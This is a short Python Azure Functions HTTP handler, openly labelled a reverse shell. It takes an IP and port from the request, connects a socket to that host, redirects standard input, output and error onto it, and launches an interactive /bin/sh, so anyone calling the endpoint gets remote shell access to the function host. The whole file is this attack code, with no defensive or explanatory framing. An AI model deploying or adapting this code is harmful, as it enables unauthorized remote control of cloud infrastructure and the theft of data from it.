import logging
import socket, os, subprocess
import azure.functions as func

# /reverseshell?ip=127.0.0.1&port=80
def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request. Reverseshell')

    IP = req.params.get('ip')
    PORT = req.params.get('port')
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP,PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

    return func.HttpResponse(
             "This HTTP triggered function executed successfully.",
             status_code=200
        )
